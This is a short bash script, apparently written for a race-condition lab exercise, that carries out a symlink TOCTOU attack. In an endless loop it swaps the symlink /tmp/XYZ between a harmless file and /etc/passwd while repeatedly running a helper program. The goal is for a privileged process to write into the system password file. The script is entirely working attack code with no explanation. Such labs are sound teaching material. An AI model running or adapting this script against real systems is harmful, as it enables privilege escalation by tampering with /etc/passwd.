#!/bin/bash

# Setup
file="/tmp/worthlessFile"
touch $file

while true; do
	ln -sf /tmp/worthlessFile /tmp/XYZ
	./yielder 
	ln -sf /etc/passwd /tmp/XYZ
	./yielder
done

# Cleanup
rm -f $file
